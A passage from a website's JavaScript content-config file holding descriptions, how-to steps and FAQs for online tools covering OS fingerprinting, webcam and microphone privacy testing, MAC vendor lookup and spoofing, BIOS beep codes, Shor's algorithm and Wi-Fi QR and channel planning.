          "Active OS fingerprinting (such as `nmap -O`) sends specially crafted TCP, UDP, and ICMP probes to a target and analyzes how its network stack responds to edge-case flags, generating detectable traffic. Passive OS fingerprinting (used by tools like `p0f` and Zeek) inspects normal captured packets—checking initial IP Time-To-Live (TTL), TCP Window Size, MSS, and TCP option ordering—with zero packets sent to the target.",
      },
      {
        question: "How can you determine a host's operating system and hop count from the IP TTL field?",
        answer:
          "Operating systems initialize the IPv4 TTL header to predictable powers of two: Linux, Android, macOS, and iOS default to 64; Windows defaults to 128; and Cisco IOS / network appliances often use 255. Every router hop decrements the TTL by 1. Therefore, if a packet arrives with TTL=52, the nearest ceiling is 64—indicating a Linux/Unix host located 64 - 52 = 12 router hops away.",
      },
      {
        question: "How do websites detect my real OS even if I spoof my User-Agent string?",
        answer:
          "A User-Agent string is trivial to alter via an extension, but JavaScript can query `navigator.platform`, `navigator.userAgentData`, font metrics, and the WebGL `WEBGL_debug_renderer_info` extension. If your User-Agent claims `Windows NT 10.0` while WebGL reports `Apple M3 Pro` and macOS system fonts, anti-bot engines immediately flag the inconsistency.",
      },
      {
        question: "Why does a timezone mismatch expose VPN users?",
        answer:
          "When you connect to a VPN server in Zurich (UTC+1/UTC+2), your IP geolocation changes to Switzerland, but your browser's `Intl.DateTimeFormat().resolvedOptions().timeZone` API still reads your local operating system clock (e.g., `America/New_York` or `Asia/Kolkata`), revealing your real region.",
      },
      {
        question: "What is an Autonomous System Number (ASN)?",
        answer:
          "An Autonomous System Number (ASN, such as AS13335 for Cloudflare or AS15169 for Google) is a globally unique identifier assigned to a large network or ISP that controls its own routing policy under Border Gateway Protocol (BGP).",
      },
    ],
    related: [
      "whois-rdap-domain-ip-lookup",
      "nmap-command-builder",
      "wireshark-tcpdump-filter-builder",
      "webcam-mic-hardware-privacy-tester",
    ],
    pillarUrl: "https://www.zerosuniverse.com/what-is-os-fingerprinting/",
    pillarTitle: "What is OS Fingerprinting? Active vs Passive TCP/IP Techniques",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },

  // =========================================================================
  // WAVE 2 — TECH & HARDWARE DIAGNOSTICS (3 Tools: #18 – #20)
  // =========================================================================
  {
    slug: "webcam-mic-hardware-privacy-tester",
    name: "Webcam, Microphone & MediaDevices Hardware Privacy Tester",
    category: "tech",
    h1: "Webcam, Microphone & MediaDevices Hardware Privacy Tester (2026)",
    subhead:
      "Test your camera resolution, FPS, and microphone frequency spectrum locally while auditing `navigator.mediaDevices.enumerateDevices()` hardware device-ID fingerprinting and permission states.",
    primaryKeyword: "webcam microphone privacy test online",
    secondaryKeywords: [
      "webcam resolution fps tester",
      "microphone audio spectrum test online",
      "mediadevices enumeratedevices privacy check",
      "camera mic permission audit browser",
    ],
    metaTitle: "Webcam & Microphone Hardware Privacy Tester (2026) — 100% Local Media Audit",
    metaDescription:
      "Test your webcam resolution/FPS and microphone audio levels in a 100% local browser sandbox. Audit MediaDevices hardware enumeration, permission persistence, and virtual camera exposure.",
    features: [
      {
        title: "Pre- vs Post-Permission Device Enumeration Diff",
        description:
          "Shows exactly what `navigator.mediaDevices.enumerateDevices()` exposes to websites BEFORE you click Allow (masked labels, device counts) versus AFTER permission is granted (full USB/Bluetooth hardware model names).",
        icon: "Shield",
      },
      {
        title: "Live Webcam Resolution, FPS & Track Constraint Inspector",
        description:
          "Stream your camera into a local HTML5 `<video>` element to verify actual native resolution (720p/1080p/4K), frame rate, aspect ratio, and active hardware indicator light behavior.",
        icon: "Activity",
      },
      {
        title: "Real-Time WebAudio FFT Microphone Spectrum & Peak Meter",
        description:
          "Visualize live microphone input across a 60fps FFT frequency canvas with decibel peak metering, noise-floor tracking, and echo-cancellation/auto-gain status.",
        icon: "Zap",
      },
      {
        title: "1-Click Hardware Track Kill-Switch",
        description:
          "Immediately invoke `MediaStreamTrack.stop()` on all video and audio tracks to verify that your laptop's physical camera LED extinguishes on command.",
        icon: "Lock",
      },
    ],
    useCases: [
      {
        title: "Pre-Meeting Camera & Microphone Hardware Diagnostics",
        description:
          "Verify that your external USB webcam, Elgato capture card, or XLR/Bluetooth microphone is delivering clean signal and full 1080p/60fps resolution before joining Zoom, Meet, or Teams.",
      },
      {
        title: "Browser Hardware Fingerprinting & Privacy Auditing",
        description:
          "See whether websites can detect how many cameras, microphones, and audio outputs are attached to your PC and whether persistent site permissions leak your hardware model names.",
      },
      {
        title: "Hardware Kill-Switch & Shutter Verification",
        description:
          "Test physical privacy shutters, hardware mute switches, and OS-level camera/microphone permissions on macOS, Windows 11, Linux PipeWire, iOS, and Android.",
      },
    ],
    howTo: [
      {
        name: "Run the Zero-Permission Enumeration Audit First",
        text: "Click 'Scan Device Inventory (No Permission)' to see what `enumerateDevices()` and the Permissions API reveal before any browser prompt is triggered.",
      },
      {
        name: "Start the Local Webcam or Microphone Test",
        text: "Click 'Test Webcam' or 'Test Microphone' and grant temporary browser access to inspect live video metrics or real-time FFT audio waveforms.",
      },
      {
        name: "Inspect Hardware Track Settings & Capabilities",
        text: "Review the exact `getSettings()` output—including width, height, frameRate, sampleRate, echoCancellation, noiseSuppression, and unmasked device labels.",
      },
      {
        name: "Click 'Release Hardware Tracks' to Verify LED Shutoff",
        text: "Terminate all active MediaStream tracks with one click and confirm your physical webcam indicator LED turns off immediately.",
      },
    ],
    faq: [
      {
        question: "Can a website see my webcam or microphone model name without asking for permission?",
        answer:
          "According to the W3C Media Capture and Streams specification, before a user grants `camera` or `microphone` permission to an origin, `navigator.mediaDevices.enumerateDevices()` returns blank strings (`\"\"`) for device `label` fields and randomized session-scoped IDs. However, the moment you grant permission even once, the browser exposes the full hardware names (e.g., 'Logitech Brio 4K', 'AirPods Pro') of all connected capture and output devices.",
      },
      {
        question: "Are my video feed or voice audio ever uploaded or recorded by this tool?",
        answer:
          "Never. The `MediaStream` returned by `getUserMedia()` is piped strictly into a local in-memory HTML5 `<video>` element and a local `AudioContext` `AnalyserNode` inside your browser tab. Zero frames or audio bytes ever touch a network socket or MediaRecorder.",
      },
      {
        question: "How are laptop webcam indicator LEDs wired on modern hardware?",
        answer:
          "On modern laptops (such as MacBooks and enterprise ThinkPads/Dells), the green or white camera privacy LED is wired in series with the CMOS image sensor's power rail in hardware or controlled by an isolated security enclave—making it physically impossible for software to power the image sensor without illuminating the LED.",
      },
      {
        question: "Why does my 1080p or 4K webcam default to 640×480 in web browsers?",
        answer:
          "When `getUserMedia({ video: true })` is called without explicit resolution constraints, WebRTC defaults to VGA (640×480) to conserve CPU and bandwidth. Passing `ideal: { width: 1920, height: 1080 }` instructs the browser to negotiate the camera's native Full HD mode.",
      },
      {
        question: "How do I revoke camera and microphone permissions after testing?",
        answer:
          "Click the tune/padlock icon on the left side of your browser's address bar and toggle Camera and Microphone back to 'Ask (default)' or 'Block', then click our 'Release Hardware Tracks' button to close active streams immediately.",
      },
    ],
    related: [
      "ip-asn-os-fingerprint-inspector",
      "mac-address-oui-vendor-lookup",
      "bpm-tap-tempo-synth-frequency-studio",
      "morse-code-audio-flashlight-translator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/facial-recognition/",
    pillarTitle: "What is Facial & Voice Biometric Recognition? Hardware Privacy Guide",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "mac-address-oui-vendor-lookup",
    name: "MAC Address Vendor OUI Lookup & Spoofing Command Generator",
    category: "tech",
    h1: "MAC Address Vendor OUI Lookup, Bit Analyzer & Spoofing Generator (2026)",
    subhead:
      "Identify network hardware manufacturers from IEEE 24-bit OUI prefixes, inspect Unicast/Multicast and Locally Administered (LAA) randomized MAC bits, convert Cisco dotted notation, and generate OS spoofing commands.",
    primaryKeyword: "mac address vendor lookup",
    secondaryKeywords: [
      "ieee oui mac vendor finder",
      "mac address spoofing command generator",
      "locally administered mac address detector",
      "mac address format converter cisco",
    ],
    metaTitle: "MAC Address OUI Vendor Lookup & Spoofing Generator (2026) — IEEE Bit Analyzer",
    metaDescription:
      "Look up any MAC address vendor OUI (Apple, Intel, Cisco, Espressif, VMware), detect iOS/Android Locally Administered randomized MACs, convert formats, and generate Linux/macOS/Windows MAC spoofing CLI commands.",
    features: [
      {
        title: "IEEE 24-Bit OUI Manufacturer & VM Detector",
        description:
          "Identifies hardware vendors and hypervisors (Apple, Intel, Cisco, Samsung, Raspberry Pi, Espressif IoT, VMware `00:50:56`, VirtualBox `08:00:27`, Docker, QEMU/KVM).",
        icon: "Database",
      },
      {
        title: "First-Octet U/L & I/G Bitwise Dissector",
        description:
          "Decodes Bit 0 (Individual Unicast vs Group Multicast) and Bit 1 (Universally Administered IEEE burned-in OUI vs Locally Administered Private/Randomized MAC).",
        icon: "Cpu",
      },
      {
        title: "4-Format MAC Converter & SLAAC EUI-64 Calculator",
        description:
          "Instantly converts between Colon (`AA:BB:CC:DD:EE:FF`), Hyphen (`AA-BB-CC-DD-EE-FF`), Cisco Dotted (`aabb.ccdd.eeff`), Raw Hex, and IPv6 Modified EUI-64 (`fe80::`) link-local addresses.",
        icon: "Code",
      },
      {
        title: "Realistic MAC Generator & Cross-OS Spoofing CLI",
        description:
          "Generate valid vendor-prefixed or LAA-compliant random MAC addresses with copy-ready spoofing commands for Linux (`ip link` / `macchanger`), macOS (`ifconfig en0`), and Windows PowerShell.",
        icon: "Terminal",
      },
    ],
    useCases: [
      {
        title: "Rogue Device & IoT Identification on Local LANs",
        description:
          "Paste unknown MAC addresses from your router's DHCP client table or `arp -a` output to distinguish smart-home ESP32 sensors, virtual machines, and mobile phones.",
      },
      {
        title: "Public Wi-Fi Privacy & Captive Portal Testing",
        description:
          "Generate Locally Administered (LAA) or vendor-matched MAC addresses and copy exact interface commands to rotate your laptop's hardware address on untrusted networks.",
      },
      {
        title: "Network Engineering Format Normalization",
        description:
          "Convert MAC addresses between Windows `ipconfig /all` hyphen notation, Linux colon notation, and Cisco Catalyst `show mac address-table` dotted-quad format.",
      },
    ],
    howTo: [
      {
        name: "Enter Any Full MAC Address or 6-Hex OUI Prefix",
        text: "Paste a MAC address in any format (`00:50:56:C0:00:08`, `00-1A-2B-3C-4D-5E`, or `0050.56c0.0008`) or click a vendor preset.",
      },
      {
        name: "Inspect the Vendor Match & First-Octet Binary Bits",
        text: "Check the identified manufacturer and look at Bit 1 of the first byte to see if the address is a factory-burned UAA or an iOS/Android randomized Private Wi-Fi address (LAA).",
      },
      {
        name: "Copy Normalized Formats & IPv6 EUI-64 Address",
        text: "Copy Colon, Hyphen, Cisco Dotted, or the derived IPv6 `fe80::` link-local SLAAC address with a single click.",
      },
      {
        name: "Generate a New MAC & Copy OS Spoofing Commands",
        text: "Pick a target vendor prefix or LAA random mode, enter your interface name (`eth0`, `wlan0`, `en0`), and copy the Linux, macOS, or Windows PowerShell commands.",
      },
    ],
    faq: [
      {
        question: "How is a 48-bit MAC address structured?",
        answer:
          "A standard IEEE 802 48-bit (6-byte) MAC address is split into two 24-bit halves: the first 3 bytes (6 hex characters) form the Organizationally Unique Identifier (OUI) assigned to the hardware manufacturer by the IEEE, and the final 3 bytes form the Network Interface Controller (NIC) serial number assigned by that vendor.",
      },
      {
        question: "How can I tell if a MAC address is randomized (Private Wi-Fi Address on iOS/Android/Windows)?",
        answer:
          "Inspect the second hexadecimal character of the first byte (which controls the U/L Locally Administered bit, bit 1). If that second hex digit is `2`, `6`, `A`, or `E` (for example, `DA:A1:19:...` or `02:42:AC:...`), the Locally Administered Address (LAA) bit is set to 1—meaning the MAC is software-generated or randomized for privacy rather than burned into hardware.",
      },
      {
        question: "Why does MAC address spoofing fail if the first byte is an odd hex number?",
        answer:
          "The least significant bit of the first byte (Bit 0, the I/G bit) determines whether a frame is Unicast (`0`, even second hex digit) or Multicast (`1`, odd second hex digit like `1`, `3`, `5`, `7`, `9`, `B`, `D`, `F`). Network interfaces cannot assign a Multicast MAC address as a source hardware address, so `ip link` and `ifconfig` will reject it with `Cannot assign requested address`.",
      },
      {
        question: "How does IPv6 SLAAC EUI-64 expose a device's hardware MAC address?",
        answer:
          "Traditional IPv6 Stateless Address Autoconfiguration (EUI-64) builds the 64-bit interface ID by splitting the 48-bit MAC address in the middle, inserting `FF:FE`, and flipping the 7th bit (the U/L bit). Anyone who sees an EUI-64 IPv6 address (identifiable by `ff:fe` in the middle of the last 64 bits) can reverse the calculation to recover the exact hardware MAC address and vendor.",
      },
      {
        question: "Does a MAC address travel across the internet past my local router?",
        answer:
          "No. MAC addresses operate strictly at Layer 2 (Data Link Layer) within your local Ethernet or Wi-Fi broadcast domain. Every time an IP packet crosses a Layer-3 router hop, the router strips the incoming Layer-2 Ethernet header and encapsulates the packet in a brand-new frame using its own interface MAC address.",
      },
    ],
    related: [
      "arp-mitm-attack-packet-visualizer",
      "ipv4-ipv6-cidr-subnet-vlsm-calculator",
      "wifi-qr-code-channel-planner",
      "wireshark-tcpdump-filter-builder",
    ],
    pillarUrl: "https://www.zerosuniverse.com/mac-address/",
    pillarTitle: "What is a MAC Address & How to Find or Spoof It Safely",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },
  {
    slug: "bios-beep-code-shortcut-troubleshooter",
    name: "Interactive BIOS Beep Code Player & Task Manager Shortcut Finder",
    category: "tech",
    h1: "Interactive BIOS POST Beep Code Player & Emergency Shortcut Finder (2026)",
    subhead:
      "Listen to synthesized WebAudio motherboard POST beep patterns across AMI, Award, Phoenix, Dell, and HP systems, plus look up BIOS boot keys (`F2`, `Del`, `F12`) and frozen-PC recovery shortcuts.",
    primaryKeyword: "bios beep codes troubleshooter",
    secondaryKeywords: [
      "ami award phoenix bios beep codes",
      "motherboard post beep sound player",
      "bios boot menu key by manufacturer",
      "windows task manager gpu reset shortcuts",
    ],
    metaTitle: "Interactive BIOS Beep Code Player & Boot Key Finder (2026) — POST Troubleshooter",
    metaDescription:
      "Diagnose PC no-POST boot failures by matching or listening to AMI, Award, Phoenix, Dell, and HP BIOS beep codes (800Hz WebAudio player). Includes motherboard boot keys and Windows/macOS/Linux recovery shortcuts.",
    features: [
      {
        title: "Real-Time 800Hz WebAudio Piezo Beep Synthesizer",
        description:
          "Click 'Play Beep Pattern' on any diagnostic card to hear the exact square-wave piezo cadence (short, long, and repeating pause intervals) using the browser's WebAudio API.",
        icon: "Activity",
      },
      {
        title: "Multi-Vendor BIOS & Q-LED Fault Database",
        description:
          "Filter POST failure codes across AMI, Award, Phoenix, Dell/Alienware LED flashes, and HP Blink Codes—covering unseated DDR4/DDR5 RAM, GPU PCIe failures, CMOS battery faults, and CPU overheating.",
        icon: "Cpu",
      },
      {
        title: "Motherboard & Laptop BIOS / Boot Menu Key Lookup",
        description:
          "Instant table of BIOS Setup (`Del`, `F2`, `F1`), One-Time Boot Menu (`F12`, `F11`, `F8`, `Esc`), and UEFI Network Recovery keys for ASUS, MSI, Gigabyte, ASRock, Dell, HP, Lenovo, and Apple Silicon.",
        icon: "Terminal",
      },
      {
        title: "Frozen OS & Display Driver Emergency Shortcuts",
        description:
          "Master critical rescue chords including `Ctrl+Shift+Esc` (Direct Task Manager), `Win+Ctrl+Shift+B` (Instant GPU Driver Reset), and Linux Magic SysRq (`REISUB`).",
        icon: "Zap",
      },
    ],
    useCases: [
      {
        title: "Black-Screen 'No Signal' PC Build Troubleshooting",
        description:
          "Match the beep cadence coming from your motherboard's 4-pin speaker header (e.g., 1 Long + 2 Short beeps or 3 Short beeps) to isolate whether the GPU or RAM DIMM is unseated.",
      },
      {
        title: "Entering UEFI Setup When Fast Boot Skips Key Prompts",
        description:
          "Look up your exact OEM boot key or copy the `shutdown /r /fw /t 0` Windows command to reboot directly into UEFI firmware settings without mashing keys.",
      },
      {
        title: "Recovering From Frozen Fullscreen Games &Hung Processes",
        description:
          "Reset a crashed NVIDIA/AMD/Intel graphics driver in 1 second with `Win+Ctrl+Shift+B` or force-open an Always-on-Top Task Manager without rebooting.",
      },
    ],
    howTo: [
      {
        name: "Select Your BIOS Vendor or Motherboard Brand",
        text: "Choose AMI (used by most modern ASUS, MSI, Gigabyte, and ASRock UEFI boards), Award, Phoenix, Dell, or HP.",
      },
      {
        name: "Filter by Beep Pattern or Click 'Play Beep Audio'",
        text: "Search by the number of long/short beeps you heard, and click Play Beep to confirm the synthesized 800Hz audio cadence matches your PC.",
      },
      {
        name: "Follow the Hardware Fix Checklist",
        text: "Read the targeted hardware remediation steps (e.g., reseat DDR5 in slot A2, check 12VHPWR GPU power cable, or clear CMOS jumper).",
      },
      {
        name: "Look Up Your OEM BIOS Boot Key or Recovery Shortcut",
        text: "Switch to the Boot Keys & Emergency Shortcuts matrix to find your laptop/motherboard's exact UEFI key or OS rescue shortcut.",
      },
    ],
    faq: [
      {
        question: "What is POST (Power-On Self-Test) and why does the motherboard use beep codes?",
        answer:
          "When you press a computer's power button, the UEFI/BIOS firmware runs a Power-On Self-Test (POST) to initialize the CPU, system clock, DRAM controller, and PCIe graphics card before any video output is possible. Because the display cannot render error messages if the RAM or GPU fails initialization, the firmware pulses an 800Hz–1000Hz square wave to the chassis piezo buzzer (or lights up CPU/DRAM/VGA/BOOT debug LEDs) to report the failing component.",
      },
      {
        question: "What does 1 Long Beep followed by 2 or 3 Short Beeps mean on most modern motherboards?",
        answer:
          "On both AMI and Award BIOS firmware (which power almost all modern ASUS, MSI, and Gigabyte motherboards), 1 Long Beep followed by 2 or 3 Short Beeps indicates a Graphics Card (VGA) detection failure. Reseat the GPU in the primary PCIe x16 slot, verify that all PCIe 8-pin or 12VHPWR power connectors are fully latched, and ensure your monitor cable is plugged into the GPU rather than the motherboard I/O.",
      },
      {
        question: "Why does my modern gaming motherboard not beep at all when it fails to boot?",
        answer:
          "Most modern desktop motherboards no longer solder a physical piezo buzzer onto the PCB; instead, they provide a 4-pin `SPEAKER` header next to the front-panel switch pins and include 4 surface-mount EZ-Debug / Q-LED indicators labeled `CPU` (Red), `DRAM` (Yellow), `VGA` (White), and `BOOT` (Green).",
      },
      {
        question: "How do I enter UEFI/BIOS setup on Windows 11 if Fast Boot ignores the Del/F2 key?",
        answer:
          "Open an elevated Command Prompt or PowerShell window and run `shutdown /r /fw /t 0`. Windows will immediately restart and instruct the motherboard firmware to boot directly into the UEFI BIOS configuration screen without requiring any key presses.",
      },
      {
        question: "What does the Windows shortcut Win + Ctrl + Shift + B actually do?",
        answer:
          "Pressing `Win + Ctrl + Shift + B` triggers a Windows Desktop Window Manager (DWM) graphics subsystem reset: you will hear a single system beep, the screen will flash black for one second, and Windows will restart the user-mode display driver (NVIDIA, AMD, or Intel) without closing your open applications or games.",
      },
    ],
    related: [
      "webcam-mic-hardware-privacy-tester",
      "morse-code-audio-flashlight-translator",
      "mac-address-oui-vendor-lookup",
      "iphone-secret-dialer-codes-finder",
    ],
    pillarUrl: "https://www.zerosuniverse.com/bios-basic-input-output-system/",
    pillarTitle: "What is BIOS / UEFI & How POST Hardware Diagnostics Work",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },

  // =========================================================================
  // WAVE 2 — AI & QUANTUM COMPUTING (1 Tool: #21)
  // =========================================================================
  {
    slug: "quantum-shors-algorithm-rsa-simulator",
    name: "Post-Quantum Cryptography & Shor's Algorithm Qubit Simulator",
    category: "ai",
    h1: "Post-Quantum Cryptography & Shor's Algorithm Qubit Simulator (2026)",
    subhead:
      "Execute Shor's quantum period-finding algorithm ($a^r \\equiv 1 \\pmod N$) step-by-step on toy RSA moduli and calculate logical vs physical surface-code qubits required to break RSA-2048 and ECC P-256.",
    primaryKeyword: "quantum computing rsa qubit calculator",
    secondaryKeywords: [
      "shors algorithm simulator online",
      "qubits needed to break rsa 2048",
      "nist post quantum cryptography ml-kem ml-dsa",
      "quantum period finding visualizer",
    ],
    metaTitle: "Shor's Algorithm & Post-Quantum RSA Qubit Calculator (2026) — NIST PQC Tool",
    metaDescription:
      "Interactive Shor's Algorithm period-finding simulator and Cryptographically Relevant Quantum Computer (CRQC) qubit calculator. Compare RSA-2048, ECC P-256, AES-256, and NIST FIPS 203/204 (ML-KEM/ML-DSA).",
    features: [
      {
        title: "Interactive Shor's Period-Finding ($a^x \\bmod N$) Engine",
        description:
          "Pick a semiprime $N = p \\times q$ (15, 21, 33, 35, 55, 77, 91, 143, 221) and base $a$ to visualize the modular exponentiation wave, Quantum Fourier Transform (QFT) period $r$, and $\\gcd(a^{r/2} \\pm 1, N)$ factor extraction.",
        icon: "Cpu",
      },
      {
        title: "Logical vs Physical Surface-Code Qubit Calculator",
        description:
          "Calculates the $2n + 3$ Beauregard logical qubits, Toffoli gate depth ($O(n^3)$), and Gidney-Ekerå physical surface-code qubits needed to factor RSA-1024, RSA-2048, RSA-4096, and ECDSA P-256.",
        icon: "Activity",
      },
      {
        title: "Grover's Algorithm vs Symmetric AES-128/256 Analyzer",
        description:
          "Demonstrates why Shor's algorithm devastates asymmetric RSA/ECC (exponential speedup) while Grover's algorithm only halves symmetric key bit-security ($O(2^{n/2})$), leaving AES-256 and SHA-384 quantum-safe.",
        icon: "Lock",
      },
      {
        title: "NIST FIPS 203 / 204 / 205 PQC Migration Matrix",
        description:
          "Compare public-key, ciphertext, and signature byte sizes across classical RSA/ECDSA and NIST-standardized Post-Quantum Lattice/Hash algorithms (ML-KEM-768 Kyber, ML-DSA-65 Dilithium, SLH-DSA Sphincs+).",
        icon: "Shield",
      },
    ],
    useCases: [
      {
        title: "'Harvest Now, Decrypt Later' (HNDL) Threat Modeling",
        description:
          "Evaluate whether long-lived confidential data encrypted over classic TLS/RSA/ECDHE must transition immediately to hybrid X25519MLKEM768 key exchange.",
      },
      {
        title: "Quantum Computing & Cryptography University Education",
        description:
          "See exactly how integer factorization reduces to finding the period $r$ of $f(x) = a^x \\bmod N$ and why odd periods or $a^{r/2} \\equiv -1 \\pmod N$ require selecting a new base $a$.",
      },
      {
        title: "Enterprise TLS & PKI Post-Quantum Bandwidth Planning",
        description:
          "Compare the network packet overhead of migrating from 32-byte X25519 keys to 1,184-byte ML-KEM-768 public keys and 3,309-byte ML-DSA-65 signatures.",
      },
    ],
    howTo: [
      {
        name: "Select an Algorithm to Audit in the CRQC Qubit Estimator",
        text: "Pick RSA-2048, RSA-4096, ECC P-256, AES-128, AES-256, or ML-KEM-768 (Kyber) to inspect logical qubits, physical qubits, and quantum resistance status.",
      },
      {
        name: "Choose a Semiprime N & Coprime Base a in the Shor's Simulator",
        text: "Select a composite number $N = p \\times q$ (e.g., $N = 15$, $21$, $35$, or $91$) and a coprime base $a$ in the interactive period-finding lab.",
      },
      {
        name: "Inspect the Modular Exponentiation Wave & Period r",
        text: "Trace the repeating sequence of $f(x) = a^x \\bmod N$ across $x = 0, 1, 2, \\dots$ to see how quantum superposition and QFT isolate the period $r$.",
      },
      {
        name: "Review Classical GCD Factor Extraction & NIST PQC Replacements",
        text: "Verify how $\\gcd(a^{r/2} - 1, N)$ and $\\gcd(a^{r/2} + 1, N)$ reveal the secret prime factors $p$ and $q$, then review the NIST FIPS 203/204 migration guide.",
      },
    ],
    faq: [
      {
        question: "How does Shor's algorithm break RSA encryption?",
        answer:
          "RSA security relies on the hardness of factoring a large semiprime $N = p \\times q$. Number theory shows that factoring $N$ can be reduced to finding the even period $r$ of the modular exponentiation function $f(x) = a^x \\bmod N$ (such that $a^r \\equiv 1 \\pmod N$). Once a quantum computer finds $r$ using Quantum Phase Estimation and the Quantum Fourier Transform (QFT), a classical computer immediately extracts the factors via Euclidean $\\gcd(a^{r/2} - 1, N)$ and $\\gcd(a^{r/2} + 1, N)$.",
      },
      {
        question: "Why is there such a huge difference between 4,099 logical qubits and ~20 million physical qubits for RSA-2048?",
        answer:
          "Physical superconducting or trapped-ion qubits are noisy and suffer from decoherence and gate errors when executing billions of sequential Toffoli gates. To run an 8-hour Shor's circuit without a single bit-flip ruining the calculation, thousands of physical qubits must be entangled into a fault-tolerant topological Surface Code patch to represent just 1 error-corrected logical qubit (as modeled by Gidney and Ekerå).",
      },
      {
        question: "Is Elliptic Curve Cryptography (ECC P-256 / Ed25519) safer against quantum computers than RSA-2048?",
        answer:
          "No—in fact, ECC requires fewer logical qubits to break than RSA! Because ECC keys are much shorter (256 bits vs 2048 bits) and the Elliptic Curve Discrete Logarithm Problem (ECDLP) is also solved by Shor's algorithm, breaking P-256 requires roughly ~2,330 logical qubits compared to ~4,099 logical qubits for RSA-2048.",
      },
      {
        question: "Does quantum computing break AES-256 or SHA-256?",
        answer:
          "No. Symmetric ciphers (AES) and cryptographic hash functions (SHA-2/SHA-3) do not rely on algebraic period-finding structures, so Shor's algorithm does not apply to them. Grover's quantum search algorithm provides only a quadratic speedup ($O(\\sqrt{N})$), which effectively halves the key length: AES-256 retains 128 bits of post-quantum security ($2^{128}$ quantum operations), which remains computationally unbreakable.",
      },
      {
        question: "What are the official NIST Post-Quantum Cryptography standards (FIPS 203, 204, 205)?",
        answer:
          "In August 2024, NIST finalized its core Post-Quantum Cryptography standards based on Module-Lattice and stateless hash problems: FIPS 203 (`ML-KEM`, formerly CRYSTALS-Kyber) for general encryption and TLS key establishment; FIPS 204 (`ML-DSA`, formerly CRYSTALS-Dilithium) for digital signatures; and FIPS 205 (`SLH-DSA`, formerly SPHINCS+) for stateless hash-based signatures.",
      },
    ],
    related: [
      "pgp-aes-webcrypto-encryption-studio",
      "brute-force-dictionary-attack-simulator",
      "password-entropy-breach-checker",
      "local-llm-vram-calculator",
    ],
    pillarUrl: "https://www.zerosuniverse.com/quantum-computing/",
    pillarTitle: "Why Quantum Computing Threatens RSA Encryption & NIST Post-Quantum Guide",
    lastUpdated: "2026-09-28T00:00:00.000Z",
  },

  // =========================================================================
  // WAVE 2 — ANDROID, WIRELESS & P2P NETWORKING (3 Tools: #22 – #24)
  // =========================================================================
  {
    slug: "wifi-qr-code-channel-planner",
    name: "Wi-Fi WPA3/WPA2 QR Code Generator & 2.4/5/6GHz Channel Planner",
    category: "android",
    h1: "Wi-Fi WPA3/WPA2 QR Code Card Generator & 2.4/5/6GHz Channel Planner (2026)",
    subhead:
      "Generate zero-server SVG Wi-Fi QR codes (`WIFI:T:SAE;...`) for instant iOS/Android camera connection, plus visualize 2.4GHz non-overlapping channels (1, 6, 11), 5GHz DFS radar bands, and Wi-Fi 6E/7 6GHz 160/320MHz spectrum.",
    primaryKeyword: "wifi qr code generator channel planner",
    secondaryKeywords: [
      "wpa3 wifi qr code generator offline",
      "2.4ghz 5ghz 6ghz wifi channel planner",
      "non overlapping wifi channels 1 6 11",
      "wifi 6e 7 channel width 160mhz 320mhz",
    ],
    metaTitle: "Wi-Fi WPA3/WPA2 QR Code Generator & 2.4/5/6GHz Channel Planner (2026)",
    metaDescription:
      "Create printable Wi-Fi guest QR codes (WPA3-SAE & WPA2) 100% locally in your browser, and plan interference-free 2.4GHz (1/6/11), 5GHz UNII/DFS, and 6GHz Wi-Fi 6E/7 channels.",
    features: [
      {
        title: "100% Client-Side Wi-Fi QR Code SVG Engine",
        description:
          "Encodes ZXing-standard `WIFI:T:WPA;S:...;P:...;H:...;;` payloads into crisp vector QR codes with RFC special-character escaping (`\\;`, `\\:`, `\\\\`) and printable guest cards.",
        icon: "Wifi",
      },
      {
        title: "2.4GHz Co-Channel vs Adjacent-Channel Overlap Visualizer",
        description:
          "Interactive 22MHz carrier spectrum graph demonstrating why channels 1, 6, and 11 are the only non-overlapping 2.4GHz channels in North America and why channels 2–5 or 7–10 cause destructive ACI interference.",
        icon: "Activity",
      },
      {
        title: "5GHz UNII-1/2/3 & Weather Radar (DFS) Channel Planner",
        description:
          "Map 20/40/80/160MHz channel bonding across UNII-1 (36–48), DFS radar channels (52–144, including TDWR 120–128 warnings), and high-power UNII-3 (149–165).",
        icon: "Globe",
      },
      {
        title: "Wireless Security Protocol Scorer (WEP to WPA3-SAE)",
        description:
          "Audit your router's encryption posture across Open, WEP, WPA-TKIP, WPA2-PSK (PMKID/4-way handshake cracking risk), and WPA3-SAE with Protected Management Frames (802.11w).",
        icon: "Shield",
      },
    ],
    useCases: [
      {
        title: "Zero-Knowledge Home & Office Guest Wi-Fi Cards",
        description:
          "Print a sleek Wi-Fi QR tent card that Android and iPhone cameras scan natively—without ever typing your Wi-Fi password into a cloud QR generator.",
      },
      {
        title: "Multi-AP Mesh & Enterprise Channel Allocation",
        description:
          "Assign non-overlapping 2.4GHz (1/6/11) and 5GHz 80MHz channels (36, 52, 100, 149) across multi-access-point homes or offices to eliminate self-interference.",
      },
      {
        title: "Wireless Security Hardening (WPA3 & 802.11w PMF)",
        description:
          "Understand why disabling WPS PIN, upgrading WPA2 to WPA3-SAE (Dragonfly), and enabling 802.11w stops offline dictionary attacks and Wi-Fi Deauthentication floods.",
      },
    ],
    howTo: [
      {
        name: "Enter Your Network Name (SSID) & Password",
        text: "Type your exact Wi-Fi SSID and passphrase into the local generator (nothing leaves your browser tab).",
      },
      {
        name: "Select Encryption Type (WPA3-SAE, WPA2-PSK, or Open)",
        text: "Choose WPA2/WPA3, toggle 'Hidden SSID' if applicable, and optionally mask the plaintext password on the printable card.",
      },
      {
        name: "Audit Your 2.4GHz, 5GHz & 6GHz Channel Selection",
        text: "Use the interactive spectrum analyzer below to pick interference-free channels and optimal channel widths (20MHz for 2.4GHz, 80MHz for 5GHz, 160/320MHz for 6GHz).",
      },
      {
        name: "Download SVG/Print Card or Copy Router Hardening Steps",
        text: "Download the crisp vector SVG QR code, print the guest card, and apply the recommended router security checklist.",
      },
    ],
    faq: [
      {
        question: "Why should I only use Channels 1, 6, or 11 on 2.4GHz Wi-Fi?",
        answer:
